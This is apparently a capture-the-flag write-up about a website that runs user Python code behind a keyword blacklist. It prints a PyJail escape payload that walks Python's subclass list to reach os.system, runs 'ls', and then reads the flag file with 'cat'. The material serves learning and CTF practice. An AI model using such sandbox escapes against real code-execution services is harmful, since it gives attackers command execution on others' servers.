## About the Challenge
We were given a website and a source code. (You can download the source code [here](server.zip))

![preview](images/preview.png)

So, this website can run our python code but there are some blacklisted keywords, for example: `__import__` or `__builtins__` and other restriction like we need to input ASCII character and we cant upload a very large file, etc.

## How to Solve?
This is like PyJail challs but in web version, so to solve this. Im using one of the PyJail payload:

```python
print(dict.__class__.__base__.__subclasses__()[132].__init__.__globals__["sys"].modules["os"].system("ls"))
```

And the result was

![ls](images/ls.png)

And then change the `ls` command to `cat flag-0f8794c6-9e3b-4458-8ee6-eeb6b3a34a68.txt` to obtain the flag
